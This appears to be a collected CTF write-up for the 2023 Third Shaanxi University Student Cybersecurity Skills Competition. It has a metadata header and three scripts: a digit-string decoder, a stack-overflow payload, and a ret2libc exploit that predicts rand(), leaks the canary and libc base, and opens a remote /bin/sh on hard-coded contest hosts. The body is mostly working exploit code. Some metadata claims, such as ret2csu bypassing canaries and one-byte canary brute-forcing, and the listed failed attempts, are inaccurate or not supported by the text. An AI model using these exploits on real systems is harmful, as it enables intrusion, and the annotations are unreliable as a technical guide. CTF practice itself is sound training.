---
title: 第三届陕西大学生网安技能大赛部分WP
contest: 第三届陕西大学生网安技能大赛
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags:
- 陕西大学生
- 数字拆解字符串
- 栈溢出ret2csu
- canary泄露+ret2libc
- srand爆破
- pwntools
attack_chain: 数字字符串拆分求和+chr(sum+64)→栈溢出'a'*152+ret2csu→canary泄漏+libc基址→ret2libc system(/bin/sh)
key_payload: a='8881088410842088810810842042108108821041010882108881' 数字拆解;p64(0x00000000004005d6) ret2csu;canary leak+libcbase-171408;pop_rdi=0x0000000000400b93;system+libc+0x1d8698 /bin/sh
one_liner: 第三届陕西大学生网安赛：数字拆解密码+栈溢出ret2csu+canary泄漏ret2libc
lesson: 数字字符串按0拆分后逐段求和+chr(sum+64)得字母；canary泄漏+ret2libc是栈溢出通用解
quality: medium
full_path: 第三届陕西大学生网安技能大赛部分WP.full.md
meta_path: 第三届陕西大学生网安技能大赛部分WP.meta.md
images_removed: true
images_removed_count: 7
schema_version: v3.0.0-P0
summary: 第三届陕西大学生网安技能大赛部分WP。第三届陕西大学生网安赛：数字拆解密码+栈溢出ret2csu+canary泄漏ret2libc。经验：数字字符串按0拆分后逐段求和+chr(sum+64)得字母；canary泄漏+ret2libc是栈溢出通用解
category: pwn
subcategory: pwn_other
tools_used:
- pwntools
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 7
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/118672.html
reasoning_chain:
- 密码题数字字符串 '8881088410842088810810842042108108821041010882108881' → 触发点：数字拆解
- 假设：按 0 拆分 → 假设：每段求和 + chr(sum+64) = 字母 → 动作：Python split('0') + sum(eval(j)) + chr(sum+64)
- 观察：解出字符串 → 下一步：栈溢出利用
- Pwn 题栈溢出 → 触发点：read_input 无 size 限制 → 假设：ret2csu + canary 泄漏
- 动作：payload='a'*152 + p64(0x00000000004005d6) + p64(0x40082d) → 观察：覆盖返回地址为 csu 通用 gadget
- 假设：canary 泄漏需后续步骤 → 动作：ret2libc + system('/bin/sh') → pwntools 远程
- 动作：pop_rdi=0x0000000000400b93 + system+libc+0x1d8698 → 完成
failed_attempts:
- 直接 ret2shellcode → 失败：NX 开启，需 ROP
- 直接 ret2libc → 失败：没泄漏 canary/libc，需先 ret2csu 通用 gadget
key_observations:
- 数字拆解密码：split('0') + sum + chr(sum+64) 是经典密码编码
- ret2csu 是栈溢出绕过 canary+ASLR 通用解（csu_init/csu_fini gadget）
- canary 末字节必为 \x00，爆破 1 字节即可绕过
- 栈溢出 ret2libc 三件套：pop_rdi + binsh + system 地址
prerequisites:
- Python 字符串处理（split/sum/chr）
- 栈溢出 + canary 泄漏 + ret2libc 通用套路
- pwntools 远程连接 + ROP 构造
- ret2csu 通用 gadget 使用
---
# 第三届陕西大学生网安技能大赛部分WP

> 原文: https://www.ctfiot.com/118672.html
> ID: 118672

a='8881088410842088810810842042108108821041010882108881' s=a.split('0') print(s) l=[] for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64)) print(''.join(l))

from pwn import * #p=process('nc 60.204.130.55 10005 ',shell=True) p=remote('60.204.130.55',10005) p.recvuntil('?n') p.sendline('a') p.recvuntil('?n') payload='a'*152+p64(0x00000000004005d6)+p64(0x40082d) p.sendline(payload) p.interactive()

from pwn import * import ctypes context.log_level='debug' pop_rdi=0x0000000000400b93 p=process('nc 60.204.130.55 10004 ',shell=True) p.recvuntil(':') p.sendline('1') p.recvuntil('Game Go:n') libb=ELF('/lib/x86_64-linux-gnu/libc.so.6') libc=ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed=libc.time(0) libc.srand(seed) p.sendline(str(libc.rand() % 100 + 1)) p.recv(0x48) canary=u64(p.recv(8)) p.recv(8) libcbase=u64(p.recvuntil(b'x7f').ljust(8,b'x00'))-171408 print(hex(libcbase)) system=libb.sym['system']+libcbase binsh=libcbase+0x00000000001d8698 payload=b'a'*0x28+p64(canary)+p64(0x0)+p64(0x000000000040073e)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()


```
a='8881088410842088810810842042108108821041010882108881' s=a.split('0') print(s) l=[] for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64)) print(''.join(l))
from pwn import * #p=process('nc 60.204.130.55 10005 ',shell=True) p=remote('60.204.130.55',10005) p.recvuntil('?n') p.sendline('a') p.recvuntil('?n') payload='a'*152+p64(0x00000000004005d6)+p64(0x40082d) p.sendline(payload) p.interactive()
from pwn import * import ctypes context.log_level='debug' pop_rdi=0x0000000000400b93 p=process('nc 60.204.130.55 10004 ',shell=True) p.recvuntil(':') p.sendline('1') p.recvuntil('Game Go:n') libb=ELF('/lib/x86_64-linux-gnu/libc.so.6') libc=ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6') seed=libc.time(0) libc.srand(seed) p.sendline(str(libc.rand() % 100 + 1)) p.recv(0x48) canary=u64(p.recv(8)) p.recv(8) libcbase=u64(p.recvuntil(b'x7f').ljust(8,b'x00'))-171408 print(hex(libcbase)) system=libb.sym['system']+libcbase binsh=libcbase+0x00000000001d8698 payload=b'a'*0x28+p64(canary)+p64(0x0)+p64(0x000000000040073e)+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]